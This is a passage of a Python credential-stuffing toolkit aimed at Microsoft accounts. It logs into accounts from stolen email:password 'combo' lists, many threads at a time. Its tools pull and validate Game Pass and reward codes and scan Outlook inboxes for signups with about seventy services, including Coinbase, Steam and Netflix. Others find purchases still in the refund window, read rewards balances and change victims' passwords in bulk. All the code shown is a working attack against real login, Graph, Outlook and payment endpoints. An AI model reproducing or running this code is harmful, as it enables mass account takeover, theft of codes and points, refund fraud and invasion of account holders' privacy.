                                code = v_clean
                                break

                    # Clipboard button
                    if not code:
                        clip_m = re.search(r'data-clipboard-text="([^"]+)"', code_html)
                        if clip_m and len(clip_m.group(1).strip()) >= 15 and "*" not in clip_m.group(1):
                            code = clip_m.group(1).strip()

                    # Any code pattern
                    if not code:
                        extracted = extract_codes_from_text(code_html)
                        if extracted:
                            code = extracted[0]

                    if code and code not in codes_found:
                        codes_found.append(code)
                except Exception:
                    pass
            else:
                # Direct extraction from row
                extracted = extract_codes_from_text(row_html)
                for c in extracted:
                    if c not in codes_found:
                        codes_found.append(c)

        # Fallback: extract from entire page
        if not codes_found:
            all_codes = extract_codes_from_text(text)
            for c in all_codes:
                if c not in codes_found:
                    codes_found.append(c)

    except Exception:
        pass

    return codes_found


def run_puller():
    header("CODE PULLER", C.BYLW)

    accounts = get_accounts()
    if not accounts:
        error("No accounts provided")
        wait_enter()
        return

    parsed = []
    for a in accounts:
        e, p = extract_combo(a)
        if e and p:
            parsed.append((e, p))

    if not parsed:
        error("No valid combos")
        wait_enter()
        return

    # Load WLIDs for validation phase
    wlids = get_wlids()

    threads = ask_threads()

    # ── Phase 1: Game Pass Fetch ──
    info(f"Phase 1: Fetching Game Pass codes from {len(parsed)} accounts...")
    print()

    all_codes = []
    fetch_results = []
    done = [0]

    def fetch_worker(args):
        email, pw = args
        r = fetch_from_account(email, pw)
        with lock:
            done[0] += 1
            codes = r.get("codes", [])
            all_codes.extend(codes)
            fetch_results.append(r)
            err = r.get("error", "")
            extra = f"{C.BGRN}{len(codes)} codes{C.RST}" if codes else (f"{C.BRED}{err}{C.RST}" if err else "")
            progress_bar(done[0], len(parsed), extra=extra)
        return r

    with ThreadPoolExecutor(max_workers=threads) as ex:
        list(ex.map(fetch_worker, parsed))

    progress_done()
    success(f"Phase 1 complete: {C.BWHT}{len(all_codes)}{C.RST} codes found")
    print()

    # ── Phase 2: PRS Recheck ──
    info("Checking if no code is left...")
    print()

    gp_set = set(all_codes)
    prs_found = [0]
    done[0] = 0

    def recheck_worker(args):
        email, pw = args
        try:
            prs_codes = prs_scrape_single(email, pw)
            new_codes = [c for c in prs_codes if c.upper().endswith("Z") and c not in gp_set]
            with lock:
                done[0] += 1
                if new_codes:
                    prs_found[0] += len(new_codes)
                    all_codes.extend(new_codes)
                    for c in new_codes:
                        gp_set.add(c)
                progress_bar(done[0], len(parsed), extra=f"+{prs_found[0]} new")
        except Exception:
            with lock:
                done[0] += 1
                progress_bar(done[0], len(parsed))

    with ThreadPoolExecutor(max_workers=min(threads, 5)) as ex:
        list(ex.map(recheck_worker, parsed))

    progress_done()
    if prs_found[0] > 0:
        success(f"Phase 2 found {C.BWHT}{prs_found[0]}{C.RST} additional codes")
    else:
        dim("  Phase 2: No additional codes found")
    print()

    # ── Phase 3: WLID Validation ──
    z_codes = [c for c in all_codes if c.upper().endswith("Z")]

    if not z_codes:
        warn("No redeemable codes (ending in Z) found")
        wait_enter()
        return

    if not wlids:
        warn(f"Found {len(z_codes)} Z-codes but no WLIDs for validation")
        save_results("unvalidated_codes.txt", z_codes)
        wait_enter()
        return

    info(f"Phase 3: Validating {len(z_codes)} codes with {len(wlids)} WLIDs...")
    print()

    formatted_wlids = []
    for w in wlids:
        if "WLID1.0=" in w:
            formatted_wlids.append(w.strip())
        else:
            formatted_wlids.append(f'WLID1.0="{w.strip()}"')

    MAX_PER_WLID = 40
    val_tasks = []
    for i, code in enumerate(z_codes):
        wlid_idx = i // MAX_PER_WLID
        if wlid_idx >= len(formatted_wlids):
            break
        val_tasks.append((code, formatted_wlids[wlid_idx]))

    val_results = {"valid": [], "used": [], "expired": [], "invalid": []}
    done[0] = 0

    def val_worker(task):
        code, wlid = task
        r = check_single_code(code, wlid)
        with lock:
            done[0] += 1
            status = r.get("status", "invalid")
            title = r.get("title", "")
            display = f"{r['code']} | {title}" if title and title != "N/A" else r["code"]
            if status in val_results:
                val_results[status].append(display)
            else:
                val_results["invalid"].append(display)
            progress_bar(done[0], len(val_tasks))

    with ThreadPoolExecutor(max_workers=min(threads, 10)) as ex:
        list(ex.map(val_worker, val_tasks))

    progress_done()
    print()

    header("FINAL RESULTS", C.BCYN)
    success(f"Valid:   {C.BGRN}{len(val_results['valid'])}{C.RST}")
    error(f"Used:    {C.BRED}{len(val_results['used'])}{C.RST}")
    warn(f"Expired: {C.BYLW}{len(val_results['expired'])}{C.RST}")
    dim(f"  Invalid: {len(val_results['invalid'])}")

    if val_results["valid"]:
        save_results("pull_valid.txt", val_results["valid"])
    if val_results["used"]:
        save_results("pull_used.txt", val_results["used"])
    if val_results["expired"]:
        save_results("pull_expired.txt", val_results["expired"])

    wait_enter()


# ═══════════════════════════════════════════════════════════════
#  TOOL 4: PROMO PULLER (links only)
# ═══════════════════════════════════════════════════════════════

def run_promo_puller():
    header("PROMO PULLER", C.BBLU)

    accounts = get_accounts()
    if not accounts:
        error("No accounts")
        wait_enter()
        return

    parsed = [(e, p) for e, p in (extract_combo(a) for a in accounts) if e and p]
    threads = ask_threads(5)

    all_links = []
    done = [0]

    def worker(args):
        email, pw = args
        r = fetch_from_account(email, pw)
        with lock:
            done[0] += 1
            links = r.get("links", [])
            all_links.extend(links)
            progress_bar(done[0], len(parsed), extra=f"{len(links)} links")

    with ThreadPoolExecutor(max_workers=threads) as ex:
        list(ex.map(worker, parsed))

    progress_done()
    print()

    header("RESULTS", C.BCYN)
    success(f"Total links: {C.BWHT}{len(all_links)}{C.RST}")

    if all_links:
        unique = list(set(all_links))
        save_results("promo_links.txt", unique)

    wait_enter()


# ═══════════════════════════════════════════════════════════════
#  TOOL 5: INBOX AIO
#  Exact same as JS microsoft-inbox.js
# ═══════════════════════════════════════════════════════════════

SERVICES = {
    "noreply@microsoft.com": "Microsoft",
    "no_reply@email.apple.com": "Apple",
    "noreply@mail.accounts.riotgames.com": "Riot",
    "noreply@id.supercell.com": "Supercell",
    "newsletter@service.tiktok.com": "TikTok",
    "no-reply@mail.instagram.com": "Instagram",
    "notifications-noreply@linkedin.com": "LinkedIn",
    "fortnite@epicgames.com": "Fortnite",
    "reply@txn-email.playstation.com": "PlayStation",
    "no-reply@coinbase.com": "Coinbase",
    "noreply@steampowered.com": "Steam",
    "info@account.netflix.com": "Netflix",
    "security@facebookmail.com": "Facebook",
    "notification@facebookmail.com": "Facebook",
    "no-reply@spotify.com": "Spotify",
    "no_reply@snapchat.com": "Snapchat",
    "hello@mail.crunchyroll.com": "Crunchyroll",
    "no-reply@accounts.google.com": "Google",
    "account-update@amazon.com": "Amazon",
    "no-reply@epicgames.com": "Epic",
    "notifications@twitter.com": "Twitter",
    "noreply@twitch.tv": "Twitch",
    "email@discord.com": "Discord",
    "noreply@roblox.com": "Roblox",
    "noreply@ea.com": "EA",
    "account@nintendo.com": "Nintendo",
    "noreply@tlauncher.org": "TLauncher",
    "no-reply@pokemon.com": "Pokemon",
    "no-reply@soundcloud.com": "SoundCloud",
    "disneyplus@mail.disneyplus.com": "DisneyPlus",
    "noreply@minecraft.net": "Minecraft",
    "noreply@mojang.com": "Minecraft",
    "noreply@accounts.mojang.com": "Minecraft",
    "no-reply@minecraft.net": "Minecraft",
    "no-reply@mojang.com": "Minecraft",
    "mojang.com": "Minecraft",
    "minecraft.net": "Minecraft",
    "noreply@hypixel.net": "Hypixel",
    "no-reply@hypixel.net": "Hypixel",
    "hypixel.net": "Hypixel",
    "noreply@accounts.minecraft.net": "MinecraftJava",
    "no-reply@account.microsoft.com": "MinecraftBedrock",
    "noreply@minecraftmarketplace.com": "MinecraftMarketplace",
    "no-reply@lunarclient.com": "LunarClient",
    "lunarclient.com": "LunarClient",
    "noreply@badlion.net": "Badlion",
    "badlion.net": "Badlion",
    "noreply@minehut.com": "Minehut",
    "minehut.com": "Minehut",
    "noreply@cubecraft.net": "CubeCraft",
    "noreply@mc-market.org": "MCMarket",
    "noreply@builtbybit.com": "BuiltByBit",
    "noreply@namemc.com": "NameMC",
    "noreply@manacube.com": "ManaCube",
    "ebay@ebay.com": "eBay",
    "noreply@eldorado.gg": "Eldorado.gg",
    "no-reply@eldorado.gg": "Eldorado.gg",
    "eldorado.gg": "Eldorado.gg",
    "noreply@pandabuy.com": "PandaBuy",
    "noreply@dazn.com": "DAZN",
    "alerts@pornhub.com": "Pornhub",
    "callofduty@comms.activision.com": "COD",
    "noreply@pubgmobile.com": "PUBG",
    "konami-info@konami.net": "Konami",
    "Azure-noreply@microsoft.com": "Azure",
    "no-reply@icloud.com": "iCloud",
    "noreply@email.apple.com": "Apple2",
    "noreply@zara.com": "Zara",
    "info@trendyolmail.com": "Trendyol",
    "no-reply@itemsatis.com": "itemsatis",
    "noreply@hesap.com.tr": "hesapcomtr",
    "starplus@mail.starplus.com": "StarPlus",
    "noreply@pokemon.com": "Pokemon",
    "noreply@email.microsoft.com": "MinecraftBedrock",
}

def inbox_check_single(email, password):
    """Check a single account's inbox for services. Same flow as JS."""
    result = {"user": email, "status": "fail", "services": {}, "country": "", "name": ""}
    s = requests.Session()
    s.headers.update({
        "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
    })
    uid = str(uuid.uuid4())

    try:
        # Step 1: IDP check
        idp_url = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={quote(email)}"
        idp_r = s.get(idp_url, headers={
            "X-OneAuth-AppName": "Outlook Lite",
            "X-Office-Version": "3.11.0-minApi24",
            "X-CorrelationId": uid,
            "Host": "odc.officeapps.live.com",
        }, timeout=15)
        idp_text = idp_r.text

        if any(x in idp_text for x in ["Neither", "Both", "Placeholder", "OrgId"]):
            result["detail"] = "IDP failed"
            return result
        if "MSAccount" not in idp_text:
            result["detail"] = "not MSAccount"
            return result

        time.sleep(0.5)

        # Step 2: OAuth authorize
        s.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        })
        auth_url = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={quote(email)}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
        auth_r = s.get(auth_url, timeout=15)
        auth_body = auth_r.text

        # Extract PPFT and urlPost
        ppft = extract_ppft(auth_body)
        url_post = extract_urlpost(auth_body)
        if not ppft or not url_post:
            result["detail"] = "PPFT/urlPost not found"
            return result

        # Step 3: Login POST
        login_data = f"i13=1&login={quote(email)}&loginfmt={quote(email)}&type=11&LoginOptions=1&passwd={quote(password)}&ps=2&PPFT={quote(ppft)}&PPSX=PassportR&NewUser=1&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0"

        login_r = s.post(url_post, data=login_data, headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://login.live.com",
            "Referer": auth_r.url,
        }, allow_redirects=False, timeout=15)

        login_body = login_r.text

        if "password is incorrect" in login_body or "error" in login_body.lower():
            result["detail"] = "bad credentials"
            return result
        if "identity/confirm" in login_body:
            result["detail"] = "identity confirm"
            return result
        if "Abuse" in login_body:
            result["detail"] = "abuse/locked"
            return result

        location = login_r.headers.get("Location", "")
        if not location:
            result["detail"] = "no redirect"
            return result

        code_m = re.search(r'code=([^&]+)', location)
        if not code_m:
            result["detail"] = "auth code not found"
            return result
        auth_code = code_m.group(1)

        cid = ""
        for ck in s.cookies:
            if ck.name == "MSPCID":
                cid = ck.value.upper()
                break
        if not cid:
            result["detail"] = "CID not found"
            return result

        # Step 4: Exchange code for token
        token_data = f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code={quote(auth_code)}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
        token_r = s.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
                         data=token_data,
                         headers={"Content-Type": "application/x-www-form-urlencoded"},
                         timeout=15)

        if "access_token" not in token_r.text:
            result["detail"] = "token exchange failed"
            return result

        token_json = token_r.json()
        access_token = token_json.get("access_token", "")
        if not access_token:
            result["detail"] = "no access_token"
            return result

        result["status"] = "hit"

        # Step 5: Profile
        profile_headers = {
            "User-Agent": "Outlook-Android/2.0",
            "Authorization": f"Bearer {access_token}",
            "X-AnchorMailbox": f"CID:{cid}",
        }

        try:
            pr = requests.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile",
                              headers=profile_headers, timeout=15)
            if pr.ok:
                pd = pr.json()
                result["country"] = pd.get("country", pd.get("countryOrRegion", ""))
                result["name"] = pd.get("displayName", pd.get("name", ""))
        except Exception:
            pass

        # Step 6: Inbox scan
        all_text = ""

        # Startup data
        try:
            sr = requests.post(
                f"https://outlook.live.com/owa/{quote(email)}/startupdata.ashx?app=Mini&n=0",
                data="", headers={
                    "Host": "outlook.live.com",
                    "authorization": f"Bearer {access_token}",
                    "action": "StartupData",
                    "content-type": "application/json; charset=utf-8",
                    "accept": "*/*",
                }, timeout=30)
            if sr.ok:
                all_text += sr.text.lower() + " "
        except Exception:
            pass

        # Graph messages
        try:
            gr = requests.get("https://graph.microsoft.com/v1.0/me/messages?$top=200&$select=from,subject",
                              headers={"Authorization": f"Bearer {access_token}", "Accept": "application/json"},
                              timeout=30)
            if gr.ok:
                all_text += gr.text.lower() + " "
        except Exception:
            pass

        # Office365 messages
        try:
            ofr = requests.get("https://outlook.office.com/api/v2.0/me/messages?$top=200&$select=From,Subject",
                               headers={"Authorization": f"Bearer {access_token}",
                                        "Accept": "application/json",
                                        "X-AnchorMailbox": f"CID:{cid}"},
                               timeout=30)
            if ofr.ok:
                all_text += ofr.text.lower() + " "
        except Exception:
            pass

        # Count services
        service_patterns = {}
        for email_pattern, name in SERVICES.items():
            if name not in service_patterns:
                service_patterns[name] = []
            service_patterns[name].append(email_pattern.lower())

        found = {}
        for svc_name, patterns in service_patterns.items():
            max_count = 0
            for pat in patterns:
                count = all_text.count(pat)
                domain = pat.split("@")[1] if "@" in pat else pat
                d_count = all_text.count(domain)
                max_count = max(max_count, count, d_count)
            if max_count > 0:
                found[svc_name] = max_count

        result["services"] = found
        if not found:
            result["status"] = "fail"
            result["detail"] = "no services found"

    except Exception as e:
        result["detail"] = str(e)[:100]

    return result

def run_inbox_aio():
    header("INBOX AIO SCANNER", C.BMAG)
    warn("This tool scans Outlook inboxes for service registrations")

    accounts = get_accounts()
    if not accounts:
        error("No accounts")
        wait_enter()
        return

    parsed = [(e, p) for e, p in (extract_combo(a) for a in accounts) if e and p]
    threads = ask_threads(5)

    info(f"Scanning {len(parsed)} accounts with {threads} threads")
    print()

    hits = []
    fails = []
    done = [0]

    def worker(args):
        email, pw = args
        r = inbox_check_single(email, pw)
        with lock:
            done[0] += 1
            if r["status"] == "hit":
                hits.append(r)
            else:
                fails.append(r)
            svc_count = len(r.get("services", {}))
            extra = f"{C.BGRN}{svc_count} services{C.RST}" if svc_count else f"{C.DIM}{r.get('detail', 'fail')}{C.RST}"
            progress_bar(done[0], len(parsed), extra=extra)

    with ThreadPoolExecutor(max_workers=threads) as ex:
        list(ex.map(worker, parsed))

    progress_done()
    print()

    header("RESULTS", C.BCYN)
    success(f"Hits:   {C.BGRN}{len(hits)}{C.RST}")
    error(f"Failed: {C.BRED}{len(fails)}{C.RST}")
    print()

    # Show service breakdown
    all_services = {}
    for h in hits:
        for svc, count in h.get("services", {}).items():
            all_services[svc] = all_services.get(svc, 0) + 1

    if all_services:
        header("SERVICES FOUND", C.CYN)
        for svc, count in sorted(all_services.items(), key=lambda x: -x[1]):
            print(f"  {C.CYN}{svc:.<30}{C.BWHT}{count} accounts{C.RST}")
        print()

    # Save results
    hit_lines = []
    for h in hits:
        svcs = ", ".join(h.get("services", {}).keys())
        hit_lines.append(f"{h['user']} | {svcs} | {h.get('country', '')} | {h.get('name', '')}")

    if hit_lines:
        save_results("inbox_hits.txt", hit_lines)

    wait_enter()


# ═══════════════════════════════════════════════════════════════
#  TOOL 6: REFUND CHECKER
#  Exact same as JS microsoft-refund.js
# ═══════════════════════════════════════════════════════════════

REFUND_WINDOW_DAYS = 14

def refund_check_single(email, password):
    result = {"user": email, "status": "fail", "refundable": [], "captures": {}, "detail": ""}
    s = CookieSession()

    try:
        # Step 1: OAuth login (same as puller)
        oauth_url = ("https://login.live.com/oauth20_authorize.srf"
                     "?client_id=0000000048170EF2"
                     "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf"
                     "&response_type=token"
                     "&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL"
                     "&display=touch")

        r0 = s.get(oauth_url)
        ppft = extract_ppft(r0.text)
        url_post = extract_urlpost(r0.text)
        if not ppft or not url_post:
            result["detail"] = "PPFT not found"
            return result

        post_data = {
            "ps": "2", "PPFT": ppft, "PPSX": "PassportRN", "NewUser": "1",
            "login": email, "loginfmt": email, "passwd": password,
            "type": "11", "LoginOptions": "1", "i13": "1",
            "IsFidoSupported": "1", "isSignupPost": "0",
        }
        r1 = s.post(url_post, data=post_data, headers={
            "Host": "login.live.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://login.live.com",
            "Referer": r0.url,
        })

        cookies_str = str(dict(s.session.cookies))
        text = r1.text
        url = r1.url

        # Check status
        if "password is incorrect" in text or "doesn't exist" in text:
            result["detail"] = "Invalid credentials"
            return result
        if "recover?mkt" in text or "identity/confirm" in text:
            result["detail"] = "2FA/Verify"
            return result
        if "/Abuse?mkt=" in text or "/cancel?mkt=" in text:
            result["detail"] = "Locked"
            return result

        if not ("ANON" in cookies_str or "WLSSC" in cookies_str):
            result["detail"] = "Login failed"
            return result

        # Step 2: Get PIFD token
        pifd_url = ("https://login.live.com/oauth20_authorize.srf?"
                    "client_id=000000000004773A&response_type=token"
                    "&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete"
                    "&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth"
                    "&state=%7B%22userId%22%3A%22bf3383c9b44aa8c9%22%2C%22scopeSet%22%3A%22pidl%22%7D"
                    "&prompt=none")
        r2 = s.get(pifd_url, headers={"Host": "login.live.com", "Referer": "https://account.microsoft.com/"})
        pifd_token = parse_lr(r2.url, "access_token=", "&")
        if not pifd_token:
            pifd_token = parse_lr(r2.url, "access_token=", "&token_type")
        if not pifd_token:
            result["detail"] = "Token failed"
            return result

        from urllib.parse import unquote
        pifd_token = unquote(pifd_token)

        pay_headers = {
            "User-Agent": UA_STR,
            "Accept": "application/json",
            "Authorization": f'MSADELEGATE1.0="{pifd_token}"',
            "Content-Type": "application/json",
            "Origin": "https://account.microsoft.com",
            "Referer": "https://account.microsoft.com/",
        }

        refundable = []

        def check_date(date_str):
            try:
                cleaned = date_str.split("+")[0].split("Z")[0][:26]
                dt = datetime.fromisoformat(cleaned)
                diff = (datetime.now() - dt).days
                return diff <= REFUND_WINDOW_DAYS, dt, diff
            except Exception:
                return False, None, 0

        # Method 1: Payment transactions
        try:
            tx_r = requests.get("https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions",
                                headers=pay_headers, timeout=15)
            tx_data = tx_r.json() if tx_r.ok else {}
            items = tx_data.get("subscriptions", tx_data.get("items", []))
            if isinstance(items, list):
                for item in items:
                    date_str = item.get("startDate", item.get("purchaseDate", ""))
                    title = item.get("title", item.get("description", "Item"))
                    amount = item.get("totalAmount", item.get("amount", ""))
                    if date_str:
                        eligible, dt, days = check_date(date_str)
                        if eligible and dt:
                            refundable.append({"title": title, "days_ago": days, "amount": str(amount)})
        except Exception:
            pass

        # Method 2: Order history
        try:
            or_r = requests.get("https://purchase.mp.microsoft.com/v7.0/users/me/orders?market=US&language=en-US&lineItemStates=All&count=50&orderBy=Date",
                                headers=pay_headers, timeout=15)
            or_data = or_r.json() if or_r.ok else {}
            orders = or_data.get("items", or_data.get("orders", []))
            if isinstance(orders, list):
                for order in orders:
                    date_str = order.get("orderDate", order.get("creationDate", order.get("purchaseDate", "")))
                    if not date_str:
                        continue
                    eligible, dt, days = check_date(date_str)
                    if not eligible:
                        continue
                    line_items = order.get("lineItems", order.get("items", [order]))
                    for li in (line_items if isinstance(line_items, list) else [line_items]):
                        title = li.get("productTitle", li.get("title", li.get("name", "Unknown")))
                        if not any(r["title"] == title and r["days_ago"] == days for r in refundable):
                            refundable.append({"title": title, "days_ago": days,
                                               "amount": str(li.get("amount", li.get("totalPrice", "N/A")))})
        except Exception:
            pass

        result["refundable"] = refundable
        if refundable:
            result["status"] = "hit"
        else:
            result["status"] = "free"

    except Exception as e:
        result["detail"] = str(e)[:100]

    return result

def run_refund():
    header("REFUND CHECKER", C.BRED)

    accounts = get_accounts()
    if not accounts:
        error("No accounts")
        wait_enter()
        return

    parsed = [(e, p) for e, p in (extract_combo(a) for a in accounts) if e and p]
    threads = ask_threads(5)

    info(f"Checking {len(parsed)} accounts for refund eligibility...")
    print()

    hits = []
    done = [0]

    def worker(args):
        email, pw = args
        r = refund_check_single(email, pw)
        with lock:
            done[0] += 1
            if r["status"] == "hit":
                hits.append(r)
            progress_bar(done[0], len(parsed))

    with ThreadPoolExecutor(max_workers=threads) as ex:
        list(ex.map(worker, parsed))

    progress_done()
    print()

    header("RESULTS", C.BCYN)
    success(f"Refundable: {C.BGRN}{len(hits)}{C.RST}")
    dim(f"  No refund: {len(parsed) - len(hits)}")

    for h in hits:
        print(f"\n  {C.BWHT}{h['user']}{C.RST}")
        for item in h.get("refundable", []):
            print(f"    {C.BGRN}>{C.RST} {item['title']} ({item['days_ago']}d ago, {item.get('amount', 'N/A')})")

    hit_lines = []
    for h in hits:
        items = "; ".join(f"{i['title']} ({i['days_ago']}d)" for i in h.get("refundable", []))
        hit_lines.append(f"{h['user']} | {items}")
    if hit_lines:
        save_results("refund_eligible.txt", hit_lines)

    wait_enter()


# ═══════════════════════════════════════════════════════════════
#  TOOL 7: REWARDS CHECKER
#  Exact same as JS microsoft-rewards.js
# ═══════════════════════════════════════════════════════════════

def rewards_check_single(email, password):
    s = CookieSession()

    try:
        # Login via ppsecure
        r0 = s.get("https://login.live.com/ppsecure/post.srf")
        html = r0.text

        ppft = extract_ppft(html)
        url_post = extract_urlpost(html)
        if not ppft or not url_post:
            return {"email": email, "success": False, "error": "Login tokens not found"}

        login_body = {
            "i13": "0", "login": email, "loginfmt": email, "type": "11",
            "LoginOptions": "3", "passwd": password, "ps": "2",
            "PPFT": ppft, "PPSX": "PassportR", "NewUser": "1",
            "fspost": "0", "i21": "0", "CookieDisclosure": "0",
            "IsFidoSupported": "1", "isSignupPost": "0",
        }
        r1 = s.post(url_post, data=login_body, headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://login.live.com",
        })

        text = r1.text
        if "password is incorrect" in text.lower() or "doesn't exist" in text.lower():
            return {"email": email, "success": False, "error": "Invalid credentials"}
        if "recover?mkt" in text or "identity/confirm" in text or "/Abuse?mkt=" in text:
            return {"email": email, "success": False, "error": "2FA/Locked"}

        # Handle KMSI
        up2 = extract_urlpost(text)
        if up2:
            sft2 = extract_ppft(text)
            if sft2:
                s.post(up2, data={"LoginOptions": "3", "type": "28", "PPFT": sft2, "i19": "19130"},
                       headers={"Content-Type": "application/x-www-form-urlencoded"})

        # Handle fmHF auto-submit
        if "fmHF" in text:
            fm_action = re.search(r'<form[^>]*(?:id="fmHF"|name="fmHF")[^>]*action="([^"]+)"', text)
            if fm_action:
                inputs = re.findall(r'<input[^>]*name="([^"]+)"[^>]*value="([^"]*)"[^>]*>', text)
                form_data = {n: v for n, v in inputs}
                s.post(fm_action.group(1), data=form_data,
                       headers={"Content-Type": "application/x-www-form-urlencoded"})

        # Navigate to billing to get verification token
        br = s.get("https://account.microsoft.com/billing/payments?fref=home.drawers.payment-options.manage-payment&refd=account.microsoft.com",
                   headers={"Referer": "https://account.microsoft.com/"})
        vrf_m = re.search(r'<input name="__RequestVerificationToken" type="hidden" value="([^"]+)"', br.text)
        if not vrf_m:
            return {"email": email, "success": False, "error": "Verification token not found"}

        vrf = vrf_m.group(1)

        # Fetch rewards balance
        rr = s.get("https://account.microsoft.com/rewards/api/pointsbalance",
                   headers={
                       "Accept": "application/json, text/plain, */*",
                       "__RequestVerificationToken": vrf,
                       "X-Requested-With": "XMLHttpRequest",
                   })
        if not rr.ok:
            return {"email": email, "success": False, "error": f"HTTP {rr.status_code}"}

        data = rr.json()
        return {
            "email": email, "success": True,
            "balance": data.get("balance", 0),
            "lifetimePoints": data.get("lifetimePoints", 0),
            "level": data.get("level", "Unknown"),
        }

    except Exception as e:
        return {"email": email, "success": False, "error": str(e)[:100]}

def run_rewards():
    header("REWARDS CHECKER", C.BYLW)

    accounts = get_accounts()
    if not accounts:
        error("No accounts")
        wait_enter()
        return

    parsed = [(e, p) for e, p in (extract_combo(a) for a in accounts) if e and p]
    threads = ask_threads(3)

    info(f"Checking {len(parsed)} accounts...")
    print()

    results = []
    done = [0]

    def worker(args):
        email, pw = args
        r = rewards_check_single(email, pw)
        with lock:
            done[0] += 1
            results.append(r)
            if r["success"]:
                extra = f"{C.BGRN}{r['balance']} pts{C.RST}"
            else:
                extra = f"{C.BRED}{r.get('error', '')}{C.RST}"
            progress_bar(done[0], len(parsed), extra=extra)

    with ThreadPoolExecutor(max_workers=threads) as ex:
        list(ex.map(worker, parsed))

    progress_done()
    print()

    header("RESULTS", C.BCYN)
    hits = [r for r in results if r["success"]]
    success(f"Success: {C.BGRN}{len(hits)}{C.RST}")
    error(f"Failed:  {C.BRED}{len(results) - len(hits)}{C.RST}")
    print()

    total_pts = 0
    lines = []
    for r in sorted(hits, key=lambda x: -x.get("balance", 0)):
        pts = r.get("balance", 0)
        total_pts += pts
        print(f"  {C.BWHT}{r['email']:.<40}{C.BGRN}{pts:>8} pts{C.RST}")
        lines.append(f"{r['email']} | {pts} pts | lifetime: {r.get('lifetimePoints', 0)}")

    if hits:
        print(f"\n  {C.BCYN}Total: {C.BWHT}{total_pts:,} points{C.RST}")
        save_results("rewards.txt", lines)

    wait_enter()


# ═══════════════════════════════════════════════════════════════
#  TOOL 8: PRS SCRAPER (standalone)
# ═══════════════════════════════════════════════════════════════

def run_prs():
    header("PRS SCRAPER (Rewards Order History)", C.BMAG)

    accounts = get_accounts()
    if not accounts:
        error("No accounts")
        wait_enter()
        return

    parsed = [(e, p) for e, p in (extract_combo(a) for a in accounts) if e and p]
    threads = ask_threads(5)

    info(f"Scraping {len(parsed)} accounts...")
    print()

    all_codes = []
    done = [0]

    def worker(args):
        email, pw = args
        codes = prs_scrape_single(email, pw)
        with lock:
            done[0] += 1
            all_codes.extend(codes)
            progress_bar(done[0], len(parsed), extra=f"{len(codes)} codes")

    with ThreadPoolExecutor(max_workers=threads) as ex:
        list(ex.map(worker, parsed))

    progress_done()
    print()

    unique = list(set(all_codes))
    header("RESULTS", C.BCYN)
    success(f"Total codes found: {C.BWHT}{len(unique)}{C.RST}")

    if unique:
        save_results("prs_codes.txt", unique)

    wait_enter()


# ═══════════════════════════════════════════════════════════════
#  TOOL 9: PASSWORD CHANGER
#  Same auth flow as JS microsoft-changer.js
# ═══════════════════════════════════════════════════════════════

def change_password_single(email, old_password, new_password):
    s = CookieSession()

    try:
        # Login to account.live.com
        r0 = s.get("https://account.live.com/password/Change")
        html = r0.text

        ppft = extract_ppft(html)
        url_post = extract_urlpost(html)

        if not ppft or not url_post:
            # Try login.live.com directly
            r0 = s.get("https://login.live.com/")
            html = r0.text
            ppft = extract_ppft(html)
            url_post = extract_urlpost(html)

        if not ppft or not url_post:
            return {"email": email, "success": False, "error": "Login tokens not found"}

        r1 = s.post(url_post, data={
            "login": email, "loginfmt": email, "passwd": old_password,
            "PPFT": ppft, "type": "11", "LoginOptions": "1",
            "ps": "2", "PPSX": "PassportR", "NewUser": "1",
        }, headers={"Content-Type": "application/x-www-form-urlencoded",
                    "Origin": "https://login.live.com"})

        text = r1.text
        if "password is incorrect" in text.lower():
            return {"email": email, "success": False, "error": "Invalid credentials"}

        # Navigate to password change
        r2 = s.get("https://account.live.com/password/Change")
        html2 = r2.text

        if "password/Change" not in r2.url and "proofs" in r2.url.lower():
            return {"email": email, "success": False, "error": "Verification required"}

        # Try API change
        canary = re.search(r'"canary"\s*:\s*"([^"]+)"', html2)
        sctx = re.search(r'"sCtx"\s*:\s*"([^"]+)"', html2)

        if canary:
            try:
                cr = s.post("https://account.live.com/API/ChangePassword",
                            json={
                                "OldPassword": old_password,
                                "NewPassword": new_password,
                                "ConfirmPassword": new_password,
                                "Canary": canary.group(1),
                            },
                            headers={"Content-Type": "application/json",
                                     "canary": canary.group(1)})
                if cr.ok and "error" not in cr.text.lower():
                    return {"email": email, "success": True}
            except Exception:
                pass

        # Form-based fallback
        ppft2 = extract_ppft(html2)
        action = re.search(r'<form[^>]*action="([^"]+)"', html2)
        if action and ppft2:
            r3 = s.post(action.group(1), data={
                "OldPassword": old_password,
                "NewPassword": new_password,
                "RetypePassword": new_password,
                "PPFT": ppft2,
            }, headers={"Content-Type": "application/x-www-form-urlencoded"})

            if "changed" in r3.text.lower() or "success" in r3.text.lower() or r3.url.endswith("Change"):
                return {"email": email, "success": True}

        return {"email": email, "success": False, "error": "Change failed"}

    except Exception as e:
        return {"email": email, "success": False, "error": str(e)[:100]}

